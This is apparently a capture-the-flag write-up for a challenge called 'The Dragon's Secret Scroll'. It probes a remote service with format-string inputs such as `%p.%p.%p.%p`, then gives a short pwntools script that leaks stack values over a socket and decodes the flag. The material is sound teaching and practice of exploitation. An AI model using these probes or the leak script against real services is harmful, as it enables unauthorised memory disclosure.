https://ctftime.org/event/2209/

# The Dragon's Secret Scroll

In the ancient kingdom of Cypheria, nestled between soaring mountains and vast forests, there lies a legend of the Dragon's Secret Scroll. This mystical scroll, forged in the flames of a dragon's breath and guarded by the Order of the Cryptic Knights, is said to contain the wisdom of ages, including the secrets of the ancient and powerful dragons.
Note : Intentionally we didn't give you any binary. :D

Connection Information

nc 173.255.201.51 51337

## Solution

When connecting to the remote you can test various payloads e.g.:

1) `whoami` to test if the input is passed to bash
2) `AAAAAAAAAA...` sufficient As to test if input is truncated when printed or causes sigsev before getting printed
3) `%p.%p.%p.%p` to test for the presence of `printf(our_input)`

We can see that with a format string we get back addresses from the stack. So we can tell that our input is passed directly to `printf` ( most likely case anyway ):

```
$ nc 173.255.201.51 51337
                       ___====-_  _-====___
                 _--^^^#####//      \\#####^^^--_
              _-^##########// (    ) \\##########^-_
             -############//  |\^^/|  \\############-
           _/############//   (@::@)   \\############\_
          /#############((     \\//     ))#############\
         -###############\\    (oo)    //###############-
        -#################\\  / VV \  //#################-
       -###################\\/      \//###################-
      _#/|##########/\######(   /\   )######/\##########|\#_
      |/ |\#/\#/\#/\/  \#/\##\  |  |  /##/\#/  \/\#/\#| \|
      `  |/  V  \    /  /  V`| |  | |'|  V  \  \    /  V  \|  '
         `   `  `      `   / | |  | | \   '      '  '   '
                          (  | |  | |  )
                         __\ | |  | | /__
                        (vvv(VVV)(VVV)vvv)
Welcome knight !!
What do you want ?:
%p.%p.%p.%p
Sorry, I can't give you.. 0x7ffff7fb35c0.(nil).(nil).0x55555555a2bc
```

If we read further up the stack we can see that some of the addresses printed by %p look like strings encoded as little endian 8 byte hex. We can decode 3 of these, representing a buffer on the stack of up to 24 bytes, as follows:

```
from pwn import *

p = remote("173.255.201.51", 51337)

p.readuntil(b"What do you want ?:\n")

payload = b"%p." * 8
p.sendline(payload)

p.readuntil(b"Sorry, I can't give you.. ")

pointers = p.readline().decode().split(".")

flag = b""
flag += struct.pack("<Q", int(pointers[5], 16))
flag += struct.pack("<Q", int(pointers[6], 16))
flag += struct.pack("<Q", int(pointers[7], 16))

print(flag[:18].decode())
```

```
$ python3 go.py 
[+] Opening connection to 173.255.201.51 on port 51337: Done
KCTF{DRAGONsCrOll}
[*] Closed connection to 173.255.201.51 port 51337
```

## Flag
`KCTF{DRAGONsCrOll}`
